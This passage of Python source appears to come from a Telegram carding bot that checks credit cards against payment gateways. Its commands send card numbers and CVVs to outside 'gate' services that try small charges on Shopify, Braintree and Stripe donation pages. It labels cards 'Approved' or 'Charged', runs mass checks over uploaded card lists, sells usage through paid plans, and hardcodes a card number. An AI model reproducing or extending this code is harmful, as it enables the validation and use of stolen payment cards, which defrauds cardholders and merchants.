
    result_message = (
        f"🎉 <b>Mass XX check completed!</b>\n\n"
        f"👤 <b>User:</b> @{message.from_user.username}\n"
        f"🔄 <b>Total Checked:</b> {checked_ccs}\n"
        f"✅ <b>Total Hits:</b> {hits}\n"
        f"❌ <b>Total Declined:</b> {declined}\n"
    )

    if hits > 0:
        result_message += f"\n<b>Hit Cards:</b>\n" + "\n".join([f"➜ <code>{card}</code>" for card in hit_cards])

    await message.reply(result_message, parse_mode=enums.ParseMode.HTML)

    os.remove(file_path) 
    
#Shopify url
           
@app.on_message(command_with_mention("nn"))
@requires_auth
@requires_plan
@anti_spam
@check_usage_limit
@ban_bin
async def process_stripe_five(client: Client, message: Message, user_info: dict, *args, **kwargs):
  message_text = message.text.split()
  if len(message_text) != 2: # Expecting /nn URL
    await message.reply(' Usage: /nn URL\n┬╗ Gateway: Stripe 19$ \n┬╗ Status: Active ', parse_mode=enums.ParseMode.HTML)
    return

  url = message_text[1]
  cc = "5578503073259776|04|2027|360" # Hardcoded CC for testing
  start_time = time.time()

  # API call to xronak.whf.bz (replace with your actual API)
  api_url = f"https://gatev2.onrender.com/shopify?cc={cc}&product={url}" 

  sticker_message = await message.reply_sticker("CAACAgUAAx0CciJZnAACSmFmxro-KQtL9T9LmoBcl_2VR0EVJQACMAQAAhiVeVTGfoGt2E8GCh4E")
  processing_message = await message.reply(' Cooking Something Good....! ', parse_mode=enums.ParseMode.HTML)

  # Process the single API request
  api_response = await fetch_api_data(api_url)

  # Calculate the time taken
  elapsed_time = time.time() - start_time
  elapsed_seconds = f"{elapsed_time:.2f} seconds" 

  # Format the final reply message (modified)
  reply_message = (
    f"SHOPIFY [ /nn ]\n"
    f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n\n"
    f"カ URL: {url}\n"
    f"カ Card: {cc}\n"
    f"Message ➜ {api_response}\n"
    f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n"
    f"Time: ➜ {elapsed_seconds}\n"
    f"Req by ➜ @{message.from_user.username} [{user_info.get('plan', 'Free')}]\n"
    f"˖ ❀ ⋆｡˚▬▬▬▬▬▬▬୨୧⋆ ˚"
  )

  # Edit the initial message with the final reply (same as before)
  await processing_message.edit(reply_message, parse_mode=enums.ParseMode.HTML)
  await sticker_message.delete()

async def fetch_api_data(api_url):
  try:
    async with aiohttp.ClientSession() as session:
      async with session.get(api_url) as response:
        return await response.text()
  except Exception as e:
    print(f"Error fetching API data: {e}")
    return "Error connecting to API" # Return a generic error message             

#Shopify

@app.on_message(command_with_mention("ll"))
@requires_auth
@requires_plan
@anti_spam
@check_usage_limit
@ban_bin
async def check_li(client, message, user_info, *args, **kwargs):
    asyncio.create_task(process_li(client, message, user_info, *args, **kwargs))

async def process_li(client, message, user_info, *args, **kwargs):
    message_text = message.text.split()
    if len(message_text) != 2:
        await message.reply('⚠️ <b>Usage:</b> <code>/ll cc|month|year|cvv</code>\n\n » 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 : Shopify + PayPal ⛅\n » Price : $5\n » Status : Active ✅', parse_mode=enums.ParseMode.HTML)
        return

    cc = message_text[1]
    user_id = str(message.from_user.id)
    plan = user_info.get('plan', 'Free')

    start_time = time.time()
    api_url = f"https://gatev2.onrender.com/shopify?cc={cc}&product=https://vptrends.com.pe//products/case-de-silicona-slim-para-tecpods-pro-blanco"
    
    processing_message = await message.reply('<b>🍳Cooking Something Good....!🍷</b>', parse_mode=enums.ParseMode.HTML)
    
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(api_url) as response:
                data = await response.json()
                
                elapsed_time = time.time() - start_time
                elapsed_seconds = f"{elapsed_time:.2f} seconds"
                
                status = data.get("response", "Declined 🔴")
                card = data.get("cc", cc)
                price = data.get("price", "N/A")
                response_msg = data.get("response", "N/A")
                took = data.get("took", "N/A")
                
                username = f"@{message.from_user.username} [{plan}]"
                
                if response_msg and any(key in response_msg for key in [
                    'Insufficient Funds',
                    'code was not matched by the processor',
                    'Card Issuer Declined CVV',
                    'Security codes does not match correct format (3-4 digits)'
                ]):
                    status = "Approved CCN ✅"
                
                elif response_msg and any(key in response_msg for key in [
                    'You’ll receive a confirmation email with your order number shortly.',
                    'Thank you for your purchase!',
                    'receive a confirmation email with your order number shortly.',
                    'order is confirmed',
                    f"Thank you {message.from_user.first_name}!",
                    'Your order is confirmed'
                ]):
                    status = "Charged 🔥"
                
                else:
                    status = "Declined ❌"

                reply_message = (
                    f"<b>{status}</b>\n"
                    f"・⌁▰▱▰▱⌁・\n\n"
                    f"-» <b>Card:</b> <code>{card}</code>\n"
                    f"--» <b>Response:</b> <b>{response_msg}</b>\n"
                    f"--» <b>Gateway:</b> <b>Shopify + PayPal</b>\n"
                    f"- - - - - - - - - - - - - - -\n"
                    f"• <b>Price:</b> <b>$5</b>\n"
                    f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n"
                    f"• <b>Time:</b> <code>{elapsed_seconds}</code>\n"
                    f"○ <b>Req by:</b> <b>{username}</b>\n"
                    f"˖ ❀ ⋆｡˚▬▬▬▬▬▬▬୨୧⋆ ˚"
                )
                
                await processing_message.edit_text(reply_message, parse_mode=enums.ParseMode.HTML)
        except aiohttp.ClientError as e:
            await processing_message.edit_text(f'⚠️ <b>Error try again</b>', parse_mode=enums.ParseMode.HTML)
            
#Shopify Mass

@app.on_message(command_with_mention("gg"))
@requires_auth
@requires_plan
@anti_spam
@check_usage_limit
async def mass_process_urls(client, message, user_info, *args, **kwargs):
  if not message.reply_to_message or not message.reply_to_message.document:
    await message.reply("⚠️ Please reply to a .txt file containing URLs.", parse_mode=enums.ParseMode.HTML)
    return

  document = message.reply_to_message.document
  if not document.file_name.endswith(".txt"):
    await message.reply("⚠️ The file must be a .txt file containing URLs.", parse_mode=enums.ParseMode.HTML)
    return

  file_path = await client.download_media(document)
  with open(file_path, "r") as file:
    urls = file.read().splitlines()

  total_urls = len(urls)
  
  progress_message = await message.reply(
    f"🛠️ Mass URL processing in progress:\n\n"
    f"👤 User: @{message.from_user.username}\n"
    f"🔄 Processed: 0\n"
    f"⏳ Left: {total_urls}",
    parse_mode=enums.ParseMode.HTML,
    disable_web_page_preview=True
  )

  processed_urls = 0
  left_urls = total_urls
  last_edit_time = time.time()

  async with aiohttp.ClientSession() as session:
    for url in urls:
      try:  # Wrap the entire URL processing in a try-except block
        start_time = time.time()
        gate_api_url = f"https://gatev2.onrender.com/gatev2?url={url}" #First API

        try:
          async with session.get(gate_api_url, timeout=30) as gate_response:  #Added timeout
            gate_api_response = await gate_response.json()  # Assuming the API returns JSON
            elapsed_time = time.time() - start_time
            elapsed_seconds = f"{elapsed_time:.2f} seconds"

            cheapest_product_url = None
            if gate_api_response and "cheapest_products" in gate_api_response and gate_api_response["cheapest_products"]:
                cheapest_product_url = gate_api_response["cheapest_products"][0]["url"]

            shopify_api_response = ""
            if cheapest_product_url:
                start_time_shopify = time.time()
                shopify_api_url = f"https://gatev2.onrender.com/shopify?cc=5578503073259776|04|2027|360&product={cheapest_product_url}" #Second API
                try:
                    async with session.get(shopify_api_url, timeout=30) as shopify_response:  #Added timeout
                        shopify_api_response = await shopify_response.text()
                        elapsed_time_shopify = time.time() - start_time_shopify
                        elapsed_seconds_shopify = f"{elapsed_time_shopify:.2f} seconds"
                        shopify_api_response = f"\nShopify API Response:\n{shopify_api_response}\nTime: ➜ {elapsed_seconds_shopify}\n"
                except aiohttp.ClientError as e:
                    shopify_api_response = f"\nError processing Shopify API for URL: {cheapest_product_url}\nError: {e}\n"
                except asyncio.TimeoutError:
                    shopify_api_response = f"\nTimeout processing Shopify API for URL: {cheapest_product_url}\n"


            reply_message = (
              f"URL: {url}\n"
              f"Gate API Response:\n{json.dumps(gate_api_response, indent=4)}\n"  #Pretty print JSON
              f"Time: ➜ {elapsed_seconds}\n"
              f"{shopify_api_response}" # Add shopify api response
              f"Req by ➜ @{message.from_user.username}\n"
            )
            await message.reply(reply_message, parse_mode=enums.ParseMode.HTML)

        except aiohttp.ClientError as e:
          reply_message = (
            f"Error processing URL: {url}\n"
            f"Error: {e}\n"
          )
          await message.reply(reply_message, parse_mode=enums.ParseMode.HTML)
        except json.JSONDecodeError as e:
          reply_message = (
            f"Error decoding JSON response from Gate API for URL: {url}\n"
            f"Error: {e}\n"
          )
          await message.reply(reply_message, parse_mode=enums.ParseMode.HTML)
        except asyncio.TimeoutError:
            reply_message = (
                f"Timeout processing Gate API for URL: {url}\n"
            )
            await message.reply(reply_message, parse_mode=enums.ParseMode.HTML)


        processed_urls += 1
        left_urls -= 1

        if time.time() - last_edit_time >= 5:
          await progress_message.edit(
            f"🛠️ Mass URL processing in progress:\n\n"
            f"👤 User: @{message.from_user.username}\n"
            f"🔄 Processed: {processed_urls}\n"
            f"⏳ Left: {left_urls}",
            parse_mode=enums.ParseMode.HTML,
            disable_web_page_preview=True
          )
          last_edit_time = time.time()

      except Exception as general_exception:  # Catch any other potential exceptions
        print(f"General Exception occurred while processing URL {url}: {general_exception}")
        await message.reply(f"General Exception occurred while processing URL {url}: {general_exception}", parse_mode=enums.ParseMode.HTML)
        processed_urls += 1  # Increment counters even on error
        left_urls -= 1

    await progress_message.delete()
    await message.reply(f"🎉 Mass URL processing completed!", parse_mode=enums.ParseMode.HTML)
    os.remove(file_path)                        
  
# Braintree vbv

@app.on_message(command_with_mention("vbv"))
@requires_auth
@requires_plan
@anti_spam
@check_usage_limit
@ban_bin
async def process_stripe_five(client: Client, message: Message, user_info: dict, *args, **kwargs):
  message_text = message.text.split()
  if len(message_text) != 2:
    await message.reply('⚠️ Usage: /vbv cc|month|year|cvv\n┬╗ Gateway: 3DS Lookup 🪽\n┬╗ Status: Active ✅', parse_mode=enums.ParseMode.HTML)
    return

  cc = message_text[1] # Get the CC from the user's command
  start_time = time.time()

  # Fetch bin data from antipublic.cc with retries
  bin_data = await fetch_bin_data(cc[:6])

  # Prepare default values for bin data in case of error
  scheme = bin_data.get('brand', 'N/A').upper() if bin_data else 'N/A'
  card_type = bin_data.get('type', 'N/A').upper() if bin_data else 'N/A'
  brand = bin_data.get('level', 'N/A').upper() if bin_data else 'N/A'
  bank_name = bin_data.get('bank', 'N/A').upper() if bin_data else 'N/A'
  country_name = bin_data.get('country_name', 'N/A').upper() if bin_data else 'N/A'
  country_emoji = bin_data.get('country_flag', 'N/A') if bin_data else 'N/A'
  currency = bin_data.get('country_currencies', ['N/A'])[0].upper() if bin_data else 'N/A'

  # API call to xronak.whf.bz (replace with your actual API)
  api_url = f"http://xronak.site/vbv.php?lista={cc}" 

  sticker_message = await message.reply_sticker("CAACAgUAAx0CciJZnAACSmFmxro-KQtL9T9LmoBcl_2VR0EVJQACMAQAAhiVeVTGfoGt2E8GCh4E")
  processing_message = await message.reply('🍳 Cooking Something Good....!🍷', parse_mode=enums.ParseMode.HTML)

  # Process the single API request
  api_response = await fetch_api_data(api_url)

  # Determine status based on API response
  status = ""
  if api_response in ['Authenticate Successful', 'Authenticate Attempt Successful']:
    status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅" # 
  else:
    status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"

  #
  elapsed_time = time.time() - start_time
  elapsed_seconds = f"{elapsed_time:.2f} seconds"

  #
  reply_message = (
    f"3DS Lookup [ /vbv ]\n"
    f"{status}\n"
    f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n\n"
    f"カ <b>Card:</b> <code>{cc}</code>\n"  # Display the card from the user's input
    f"Message ➜ {api_response}\n"
    f"┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n"
    f"⁠✿ Type: ➜ {card_type}\n"
    f"⁠✿ Level: ➜ {brand}\n"
    f"⁠✿ Bank: ➜ {bank_name}\n"
    f"⁠✿ Country: ➜ {country_name} {country_emoji}\n"
    f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n"
    f"◉ Time: ➜ {elapsed_seconds}\n"
    f"◉ Req by ➜ @{message.from_user.username} [{user_info.get('plan', 'Free')}]\n"
    f"◉ Bot ➜ @kafkachecker_bot\n"    
    f"˖ ❀ ⋆｡˚▬▬▬▬▬▬▬୨୧⋆ ˚"
  )

  #
  await processing_message.edit(reply_message, parse_mode=enums.ParseMode.HTML)
  await sticker_message.delete()


async def fetch_bin_data(bin_number):
  try:
    async with aiohttp.ClientSession() as session:
      async with session.get(f"https://bins.antipublic.cc/bins/{bin_number}") as response:
        if response.status == 200:
          return await response.json()
        else:
          return None # Return None if the request fails
  except Exception as e:
    print(f"Error fetching bin data: {e}")
    return None #

async def fetch_api_data(api_url):
  try:
    async with aiohttp.ClientSession() as session:
      async with session.get(api_url) as response:
        return await response.text()
  except Exception as e:
    print(f"Error fetching API data: {e}")
    return "Error connecting to API" # Return a generic error message 
    
     
# Braintree vbv

@app.on_message(command_with_mention("mvbv"))
@requires_auth
@requires_plan
@anti_spam
@check_usage_limit
@ban_bin
async def process_stripe_five(client: Client, message: Message, user_info: dict, *args, **kwargs):
    message_text = message.text.split()
    if len(message_text) < 2 or len(message_text) > 11: # Check for 1 to 10 CCs
        await message.reply('⚠️ Usage: /mvbv cc1 cc2 ... cc10 (Max 10 CCs)\n┬╗ Gateway: 3DS Lookup 🪽\n┬╗ Status: Active ✅', parse_mode=enums.ParseMode.HTML)
        return

    ccs = message_text[1:] # Get all CCs from the user's command
    start_time = time.time()

    async def process_single_cc(cc):
        bin_data = await fetch_bin_data(cc[:6])
        scheme = bin_data.get('brand', 'N/A').upper() if bin_data else 'N/A'
        # ... (other bin data processing as before) ...

        api_url = f"http://xronak.site/vbv.php?lista={cc}"
        api_response = await fetch_api_data(api_url)
        status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅" if api_response in ['Authenticate Successful', 'Authenticate Attempt Successful'] else "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
        return {"cc": cc, "status": status, "api_response": api_response}


    # Run the processing concurrently for all CCs
    results = await asyncio.gather(*(process_single_cc(cc) for cc in ccs))

    elapsed_time = time.time() - start_time
    elapsed_seconds = f"{elapsed_time:.2f} seconds"

    reply_message = "3DS Lookup [ /mvbv ]\n"
    for result in results:
        reply_message += (
            f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n\n"
            f"カ <b>Card:</b> <code>{result['cc']}</code>\n"
            f"Message ➜ {result['api_response']}\n"
            f"カ <b>Status:</b> {result['status']}\n"
            f"┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n"
        )

    reply_message += (
        f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n"
        f"◉ Time: ➜ {elapsed_seconds}\n"
        f"◉ Req by ➜ @{message.from_user.username} [{user_info.get('plan', 'Free')}]\n"
        f"◉ Bot ➜ @kafkachecker_bot\n"
        f"˖ ❀ ⋆｡˚▬▬▬▬▬▬▬୨୧⋆ ˚"
    )

    sticker_message = await message.reply_sticker("CAACAgUAAx0CciJZnAACSmFmxro-KQtL9T9LmoBcl_2VR0EVJQACMAQAAhiVeVTGfoGt2E8GCh4E")
    await message.reply(reply_message, parse_mode=enums.ParseMode.HTML) # Send in one message
    await sticker_message.delete()


async def fetch_bin_data(bin_number):
  try:
    async with aiohttp.ClientSession() as session:
      async with session.get(f"https://bins.antipublic.cc/bins/{bin_number}") as response:
        if response.status == 200:
          return await response.json()
        else:
          return None # Return None if the request fails
  except Exception as e:
    print(f"Error fetching bin data: {e}")
    return None #

async def fetch_api_data(api_url):
  try:
    async with aiohttp.ClientSession() as session:
      async with session.get(api_url) as response:
        return await response.text()
  except Exception as e:
    print(f"Error fetching API data: {e}")
    return "Error connecting to API" # Return a generic error message
    
  
# Braintree 7$

@app.on_message(command_with_mention("bt"))
@requires_auth
@requires_plan
@anti_spam
@check_usage_limit
@ban_bin
async def process_stripe_five(client: Client, message: Message, user_info: dict, *args, **kwargs):
  message_text = message.text.split()
  if len(message_text) != 2:
    await message.reply('⚠️ Usage: /bt cc|month|year|cvv\n┬╗ Gateway: Braintree 7$ 🪽\n┬╗ Status: Active ✅', parse_mode=enums.ParseMode.HTML)
    return

  cc = message_text[1] # Get the CC from the user's command
  start_time = time.time()

  # Fetch bin data from antipublic.cc with retries
  bin_data = await fetch_bin_data(cc[:6])

  # Prepare default values for bin data in case of error
  scheme = bin_data.get('brand', 'N/A').upper() if bin_data else 'N/A'
  card_type = bin_data.get('type', 'N/A').upper() if bin_data else 'N/A'
  brand = bin_data.get('level', 'N/A').upper() if bin_data else 'N/A'
  bank_name = bin_data.get('bank', 'N/A').upper() if bin_data else 'N/A'
  country_name = bin_data.get('country_name', 'N/A').upper() if bin_data else 'N/A'
  country_emoji = bin_data.get('country_flag', 'N/A') if bin_data else 'N/A'
  currency = bin_data.get('country_currencies', ['N/A'])[0].upper() if bin_data else 'N/A'

  # API call to xronak.whf.bz (replace with your actual API)
  api_url = f"http://xronak.site/b3x7.php?lista={cc}" 

  sticker_message = await message.reply_sticker("CAACAgUAAx0CciJZnAACSmFmxro-KQtL9T9LmoBcl_2VR0EVJQACMAQAAhiVeVTGfoGt2E8GCh4E")
  processing_message = await message.reply('🍳 Cooking Something Good....!🍷', parse_mode=enums.ParseMode.HTML)

  # Process the single API request
  api_response = await fetch_api_data(api_url)

  # Determine status based on API response
  status = ""
  if api_response in ['Insufficient Funds', 'avs', 'Card Issuer Declined CVV', 'Invalid postal code or street address', 'address does not match the billing', '1000: Approved', 'Status code 2010: Card Issuer Declined CVV (C2 : CVV2 DECLINED)', 'Status code avs: Gateway Rejected: avs', 'Status code 2001: Insufficient Funds', 'Status code cvv: Gateway Rejected: cvv', 'Status code 2001: Insufficient Funds (51 : DECLINED)', 'Status code 81724: Duplicate card exists in the vault.', 'Gateway Rejected: cvv', 'Gateway Rejected: avs']:
    status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅" # 
  else:
    status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"

  #
  elapsed_time = time.time() - start_time
  elapsed_seconds = f"{elapsed_time:.2f} seconds"

  #
  reply_message = (
    f"Braintree 7$ [ /bt ]\n"
    f"{status}\n"
    f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n\n"
    f"カ <b>Card:</b> <code>{cc}</code>\n"  # Display the card from the user's input
    f"Message ➜ {api_response}\n"
    f"┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n"
    f"⁠✿ Type: ➜ {card_type}\n"
    f"⁠✿ Level: ➜ {brand}\n"
    f"⁠✿ Bank: ➜ {bank_name}\n"
    f"⁠✿ Country: ➜ {country_name} {country_emoji}\n"
    f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n"
    f"◉ Time: ➜ {elapsed_seconds}\n"
    f"◉ Req by ➜ @{message.from_user.username} [{user_info.get('plan', 'Free')}]\n"
    f"◉ Bot ➜ @kafkachecker_bot\n"    
    f"˖ ❀ ⋆｡˚▬▬▬▬▬▬▬୨୧⋆ ˚"
  )

  #
  await processing_message.edit(reply_message, parse_mode=enums.ParseMode.HTML)
  await sticker_message.delete()


async def fetch_bin_data(bin_number):
  try:
    async with aiohttp.ClientSession() as session:
      async with session.get(f"https://bins.antipublic.cc/bins/{bin_number}") as response:
        if response.status == 200:
          return await response.json()
        else:
          return None # Return None if the request fails
  except Exception as e:
    print(f"Error fetching bin data: {e}")
    return None #

async def fetch_api_data(api_url):
  try:
    async with aiohttp.ClientSession() as session:
      async with session.get(api_url) as response:
        return await response.text()
  except Exception as e:
    print(f"Error fetching API data: {e}")
    return "Error connecting to API" # Return a generic error message
    
# Braintree 7$ mass

@app.on_message(command_with_mention("mbt"))
@requires_auth
@requires_plan
@anti_spam
@check_usage_limit
@ban_bin
async def process_stripe_five(client: Client, message: Message, user_info: dict, *args, **kwargs):
    message_text = message.text.split()
    if len(message_text) < 2 or len(message_text) > 6: # Check for 1 to 10 CCs
        await message.reply('⚠️ Usage: /mbt cc1 cc2 ... cc5 (Max 5 CCs)\n┬╗ Gateway: Braintree 7$ 🪽\n┬╗ Status: Active ✅', parse_mode=enums.ParseMode.HTML)
        return

    ccs = message_text[1:] # Get all CCs from the user's command
    start_time = time.time()

    async def process_single_cc(cc):
        bin_data = await fetch_bin_data(cc[:6])
        scheme = bin_data.get('brand', 'N/A').upper() if bin_data else 'N/A'
        # ... (other bin data processing as before) ...

        api_url = f"http://xronak.site/b3x7.php?lista={cc}"
        api_response = await fetch_api_data(api_url)
        status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅" if api_response in ['Insufficient Funds', 'avs', 'Card Issuer Declined CVV', 'Invalid postal code or street address', 'address does not match the billing', '1000: Approved', 'Status code 2010: Card Issuer Declined CVV (C2 : CVV2 DECLINED)', 'Status code avs: Gateway Rejected: avs', 'Status code 2001: Insufficient Funds', 'Status code cvv: Gateway Rejected: cvv', 'Status code 2001: Insufficient Funds (51 : DECLINED)', 'Status code 81724: Duplicate card exists in the vault.', 'Gateway Rejected: cvv', 'Gateway Rejected: avs'] else "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
        return {"cc": cc, "status": status, "api_response": api_response}


    # Run the processing concurrently for all CCs
    results = await asyncio.gather(*(process_single_cc(cc) for cc in ccs))

    elapsed_time = time.time() - start_time
    elapsed_seconds = f"{elapsed_time:.2f} seconds"

    reply_message = "Braintree 7$[ /mbt ]\n"
    msg = await message.reply("Processing...") #Initial message

    for cc in ccs:
        result = await process_single_cc(cc)
        reply_message += (
            f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n\n"
            f"カ <b>Card:</b> <code>{result['cc']}</code>\n"
            f"Message ➜ {result['api_response']}\n"
            f"カ <b>Status:</b> {result['status']}\n"
            f"┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n"
        )
        await msg.edit(reply_message, parse_mode=enums.ParseMode.HTML) # Update the message


    elapsed_time = time.time() - start_time
    elapsed_seconds = f"{elapsed_time:.2f} seconds"

    reply_message += (
        f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n"
        f"◉ Time: ➜ {elapsed_seconds}\n"
        f"◉ Req by ➜ @{message.from_user.username} [{user_info.get('plan', 'Free')}]\n"
        f"◉ Bot ➜ @kafkachecker_bot\n"
        f"˖ ❀ ⋆｡˚▬▬▬▬▬▬▬୨୧⋆ ˚"
    )
    await msg.edit(reply_message, parse_mode=enums.ParseMode.HTML) #Final update

    #Sticker -  This part remains unchanged
    sticker_message = await message.reply_sticker("CAACAgUAAx0CciJZnAACSmFmxro-KQtL9T9LmoBcl_2VR0EVJQACMAQAAhiVeVTGfoGt2E8GCh4E")
    await sticker_message.delete()


async def fetch_bin_data(bin_number):
  try:
    async with aiohttp.ClientSession() as session:
      async with session.get(f"https://bins.antipublic.cc/bins/{bin_number}") as response:
        if response.status == 200:
          return await response.json()
        else:
          return None # Return None if the request fails
  except Exception as e:
    print(f"Error fetching bin data: {e}")
    return None #

async def fetch_api_data(api_url):
  try:
    async with aiohttp.ClientSession() as session:
      async with session.get(api_url) as response:
        return await response.text()
  except Exception as e:
    print(f"Error fetching API data: {e}")
    return "Error connecting to API" # Return a generic error message
 

#stripe donation 

@app.on_message(command_with_mention("svv"))
@requires_auth
@requires_plan
@anti_spam
@check_usage_limit
@ban_bin
async def process_stripe_five(client: Client, message: Message, user_info: dict, *args, **kwargs):
    message_text = message.text.split()
    if len(message_text) != 2:
        await message.reply('⚠️ Usage: /svv cc|month|year|cvv\n┬╗ Gateway: SK Based 1$ 🪽\n┬╗ Status: Active ✅', parse_mode=enums.ParseMode.HTML)
        return

    cc = message_text[1]  # Get the CC from the user's command
    start_time = time.time()

    # Fetch bin data from antipublic.cc with retries
    bin_data = await fetch_bin_data(cc[:6])

    # Prepare default values for bin data in case of error
    scheme = bin_data.get('brand', 'N/A').upper() if bin_data else 'N/A'
    card_type = bin_data.get('type', 'N/A').upper() if bin_data else 'N/A'
    brand = bin_data.get('level', 'N/A').upper() if bin_data else 'N/A'
    bank_name = bin_data.get('bank', 'N/A').upper() if bin_data else 'N/A'
    country_name = bin_data.get('country_name', 'N/A').upper() if bin_data else 'N/A'
    country_emoji = bin_data.get('country_flag', 'N/A') if bin_data else 'N/A'
    currency = bin_data.get('country_currencies', ['N/A'])[0].upper() if bin_data else 'N/A'

    # API call to xronak.whf.bz (replace with your actual API)
    api_url = f"https://all-gm57.onrender.com/skbased?cc={cc}"
    vbv_url = f"http://xronak.site/vbv.php?lista={cc}"

    sticker_message = await message.reply_sticker("CAACAgUAAx0CciJZnAACSmFmxro-KQtL9T9LmoBcl_2VR0EVJQACMAQAAhiVeVTGfoGt2E8GCh4E")
    processing_message = await message.reply('🍳 Cooking Something Good....!🍷', parse_mode=enums.ParseMode.HTML)

    # Process the API requests concurrently
    api_response, vbv_response = await asyncio.gather(
        fetch_api_data(api_url),
        fetch_api_data(vbv_url)
    )

    # Determine status based on API response
    status = ""
    if api_response in ['transaction_not_allowed', 'Security code is incorrect.', 'security code is invalid.', 'Security code is invalid.', 'incorrect_cvc', 'Your card has insufficient funds.', 'CHARGE 1$ 🔥', 'Thank you for your donation', 'Thank you for your support!', 'Thank You For Donation.', 'Thank You', 'CHARGE 1$ 🌥️', 'Your card does not support this type of purchase.']:
      status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅" 
    else:
       status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"


    #
    elapsed_time = time.time() - start_time
    elapsed_seconds = f"{elapsed_time:.2f} seconds"

    #
    reply_message = (
        f"SK Based 1$ [ /svv ]\n"
        f"{status}\n"
        f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n\n"
        f"カ Card:</b> <code>{cc}</code>\n"  # Display the card from the user's input
        f"Message ➜ {api_response}\n"
        f"VBV  ➜ {vbv_response}\n"
        f"┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n"
        f"⁠✿ Type: ➜ {card_type}\n"
        f"⁠✿ Level: ➜ {brand}\n"
        f"⁠✿ Bank: ➜ {bank_name}\n"
        f"⁠✿ Country: ➜ {country_name} {country_emoji}\n"
        f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n"
        f"◉ Time: ➜ {elapsed_seconds}\n"
        f"◉ Req by ➜ @{message.from_user.username} [{user_info.get('plan', 'Free')}]\n"
        f"◉ Bot ➜ @kafkachecker_bot\n"    
        f"˖ ❀ ⋆｡˚▬▬▬▬▬▬▬୨୧⋆ ˚"
    )

    #
    await processing_message.edit(reply_message, parse_mode=enums.ParseMode.HTML)
    await sticker_message.delete()


async def fetch_bin_data(bin_number):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://bins.antipublic.cc/bins/{bin_number}") as response:
                if response.status == 200:
                    return await response.json()
                else:
                    return None  # Return None if the request fails
    except Exception as e:
        print(f"Error fetching bin data: {e}")
        return None  #

async def fetch_api_data(api_url):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url) as response:
                return await response.text()
    except Exception as e:
        print(f"Error fetching API data: {e}")
        return "Error connecting to API"  # Return a generic error message

#mass Stripe 1$

@app.on_message(command_with_mention("msvv"))
@requires_auth
@requires_plan
@anti_spam
@check_usage_limit
async def mass_check_stripe_five(client, message, user_info, *args, **kwargs):
    if not message.reply_to_message or not message.reply_to_message.document:
        await message.reply("⚠️ <b>Please reply to a file containing CCs to check.</b>", parse_mode=enums.ParseMode.HTML)
        return

    document = message.reply_to_message.document
    if not document.file_name.endswith(".txt"):
        await message.reply("⚠️ <b>The file must be a .txt file containing CCs.</b>", parse_mode=enums.ParseMode.HTML)
        return

    file_path = await client.download_media(document)
    with open(file_path, "r") as file:
        ccs = file.read().splitlines()

    total_ccs = len(ccs)
    plan = user_info.get('plan', 'Free')

    if plan == 'Free' and total_ccs > 100:
        await message.reply("⚠️ <b>Free users can only check up to 100 CCs at a time.</b>", parse_mode=enums.ParseMode.HTML)
        return
    elif plan == 'Plus' and total_ccs > 400:
        await message.reply("⚠️ <b>Plus users can only check up to 400 CCs at a time.</b>", parse_mode=enums.ParseMode.HTML)
        return

    hits = 0
    declined = 0
    hit_cards = []

    progress_message = await message.reply(
        f"🛠️ <b>Mass SVV check in progress:</b>\n\n"
        f"👤 <b>User:</b> @{message.from_user.username}\n"
        f"🔄 <b>Checked:</b> 0\n"
        f"✅ <b>Hits:</b> 0\n"
        f"❌ <b>Declined:</b> 0\n"
        f"⏳ <b>Left:</b> {total_ccs}",
        parse_mode=enums.ParseMode.HTML,
        disable_web_page_preview=True
    )

    checked_ccs = 0
    left_ccs = total_ccs
    last_edit_time = time.time()

    async with aiohttp.ClientSession() as session:
        for cc in ccs:
            start_time = time.time()
            
            # Fetch BIN info
            bin_info_url = f"https://bins.antipublic.cc/bins/{cc[:6]}" 
            try:
                async with session.get(bin_info_url) as response:
                    bin_data = await response.json()
                    bank = bin_data.get("bank", "Unknown")
                    country = bin_data.get("country_name", "Unknown")
                    bin_info = f"Brand: {bin_data.get('brand', 'Unknown')}, Type: {bin_data.get('type', 'Unknown')}, Level: {bin_data.get('level', 'Unknown')}" 
            except aiohttp.ClientError:
                bank = "Unknown"
                country = "Unknown"
                bin_info = "Unknown"

            # Check Stripe API
            api_url = f"https://all-gm57.onrender.com/skbased?cc={cc}"
            try:
                async with session.get(api_url) as response:
                    api_response = await response.text()  # Get the response as text
                    elapsed_time = time.time() - start_time
                    elapsed_seconds = f"{elapsed_time:.2f} seconds"

                    Status = ""  # Initialize Status
                    if "🔥" in api_response:
                        Status = "Approved ✅"
                        hits += 1
                        # Fetch card directly from the cc variable (not API response)
                        card = cc  
                        hit_cards.append(card)

                        reply_message = (
                            f"<b>SK Based 1$ [ /msvv ]</b>\n"
